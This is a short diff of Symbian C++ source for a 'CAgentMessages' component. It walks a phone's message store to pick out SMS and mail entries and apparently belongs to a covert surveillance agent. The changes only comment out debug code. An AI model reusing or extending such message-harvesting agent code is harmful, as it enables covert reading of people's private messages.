@@ -25,7 +25,7 @@
 
 #include <HT\TimeUtils.h>
 
-#include <centralrepository.h>   //TODO: delete when done
+//#include <centralrepository.h>   //TODO: delete when done
 
 _LIT(KClassSms,"IPM.SMSText*");
 _LIT(KClassMail,"IPM.Note*");
@@ -297,7 +297,7 @@ void CAgentMessages::StartAgentCmdL()
 	{
 	// There is a file log for every message, so we don't open a file log here
 	__FLOG(_L("START AGENT CMD"));
-	iStopLongTask = EFalse;
+	iStopLongTask = EFalse; 
 	iMsvArray.Reset();
 	iArrayIndex = 0;
 	iMsvArray.Append(KMsvRootIndexEntryId);  
@@ -970,12 +970,13 @@ void CAgentMessages::DoOneRoundL()
 	TMsvId service;
 	TMsvEntry msvEntryIdx;
 	TInt res = iMsvSession->GetEntry(msvId, service, msvEntryIdx);
+	/*
 	if(res == KErrNone)  //TODO: delete when done with test
 		{
 		TBuf<64> description(msvEntryIdx.iDescription);
 		TBuf<64> details(msvEntryIdx.iDetails);
 		TInt a=1;
-		}
+		}*/
 	if ((res == KErrNone) && (msvEntryIdx.iType.iUid == KUidMsvMessageEntryValue)){
 		// there's no error and the entry is a message, not KUidMsvServiceEntryValue, KUidMsvFolderEntryValue, KUidMsvAttachmentEntryValue
 		if(msvEntryIdx.iMtm == KUidMsgTypeSMS)   //SMS
